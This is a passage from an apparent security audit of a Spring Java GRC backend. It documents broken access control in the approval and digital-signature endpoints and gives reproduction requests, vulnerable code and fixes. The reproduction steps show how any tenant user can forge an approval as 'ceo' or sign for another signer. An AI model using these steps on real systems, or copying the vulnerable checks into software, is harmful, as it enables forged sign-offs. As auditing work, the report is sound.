1. Log in as user A (any role). 2. Find a PENDING approval assigned to user B: GET /api/approvals/requests. 3. POST /api/approvals/requests/{externalId}/transition with {"status":"APPROVED","decidedBy":"ceo"}. 4. Request flips to APPROVED, decidedBy='ceo', although neither A nor 'ceo' was the assignee.

Resolution

Load the request, then require the authenticated principal's username equals assignedTo (or the caller holds an explicit approvals-admin permission) before permitting APPROVED/REJECTED/DELEGATED. Set decidedBy from auth.getName(), never from the body. Add a @Version column for optimistic locking on the status mutation.

▼ Before (vulnerable)
@PostMapping("/{id}/transition")
@PreAuthorize("isAuthenticated()")
public ApprovalRequestDto transition(@PathVariable String id,
                                     @RequestBody @Valid ApprovalRequestDto.TransitionRequest req) {
    return service.transition(id, req);
}
▲ After (fixed)
@PostMapping("/{id}/transition")
@PreAuthorize("isAuthenticated()")
public ApprovalRequestDto transition(@PathVariable String id,
                                     @RequestBody @Valid ApprovalRequestDto.TransitionRequest req,
                                     Authentication auth) {
    return service.transition(id, req, auth.getName());
}
// service: ApprovalRequest r = ...findByOrganisationIdAndExternalId(orgId, externalId)...;
// if (!callerUsername.equals(r.getAssignedTo())) throw new AccessDeniedException("Not the assignee");
// r.setDecidedBy(callerUsername); // ignore req.getDecidedBy()

✓ VerifiedSecurityBroken Access Control / Improper Authentication of Signer (A01)▾
Adversarial verification: confirmed — DigitalSignatureController sign (L85-90) and reject (L92-97) are gated only by isAuthenticated() and pass no caller identity to the service. DigitalSignatureService.sign()/reject() (L106-128) load the row via org-scoped get(id) but never compare the authenticated user against the stored signerUserId set at request time (L89). Therefore any authenticated user in the tenant can sign or reject any REQUESTED transaction assigned to a different designated signer — a true signature-forgery / no-binding-to-signer defect. Org-scoping prevents cross-tenant abuse but not the in-tenant signer impersonation. High is appropriate.
Location tss-grc-backend/src/main/java/com/tss/grc/module/signature/controller/DigitalSignatureController.java:85-97 Effort M Risk CVSS ~7.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N) — e-signature integrity/non-repudiation loss
tss-grc-backend/src/main/java/com/tss/grc/module/signature/service/DigitalSignatureService.java:106-128

Description

POST /api/signature/transactions/{id}/sign and /reject are guarded only by @PreAuthorize("isAuthenticated()"). The service DigitalSignatureService.sign()/reject() loads the transaction org-scoped via get() (tenancy is fine) and then transitions REQUESTED -> SIGNED/REJECTED. Neither the controller nor the service compares the authenticated principal against the transaction's signerUserId (the user the signature was requested from). Any authenticated user in the tenant can therefore complete a signature that was assigned to a different person. The sign() method records body-supplied signedDocumentHash and certificateReference verbatim with no proof the caller is the intended signer.

Root cause

Signer authorization is reduced to 'authenticated'; the transaction's signerUserId is never enforced against the caller's identity.

Evidence / proof
@PostMapping("/{id}/sign") @PreAuthorize("isAuthenticated()") public Response sign(@PathVariable Long id, @RequestBody @Valid SignRequest body) { return Response.from(service.sign(id, body)); }  // service.sign: DigitalSignatureTransaction d = get(id); requireTransitionable(d,"SIGNED"); ... no d.getSignerUserId() vs caller check.

Real-world impact

A signature transaction representing legal/regulatory sign-off (the module's stated purpose) can be SIGNED or REJECTED by someone other than the named signer. This forges attribution on attestations, board approvals, and compliance sign-offs and undermines any evidentiary value of the e-signature trail.

Reproduction

1. Initiator creates a transaction assigned to signer B (signerUserId=B). 2. Log in as user A. 3. POST /api/signature/transactions/{id}/sign with {"signedDocumentHash":"<64 hex>"}. 4. Transaction becomes SIGNED even though A is not B.

Resolution

In sign()/reject(), require that the authenticated principal's userId equals the transaction's signerUserId (or that signerUserId is null AND the caller is an explicitly delegated signer). Pass the principal id from the controller and throw 403 on mismatch. Keep /expire restricted to PLATFORM_ADMIN as it already is.

▼ Before (vulnerable)

@PreAuthorize("isAuthenticated()")
public Response sign(@PathVariable Long id, @RequestBody @Valid SignRequest body) {
    return Response.from(service.sign(id, body));
}
▲ After (fixed)
@PostMapping("/{id}/sign")
@PreAuthorize("isAuthenticated()")
public Response sign(@PathVariable Long id, @RequestBody @Valid SignRequest body,
                     Authentication auth) {
    return Response.from(service.sign(id, body, userIdOf(auth)));
}
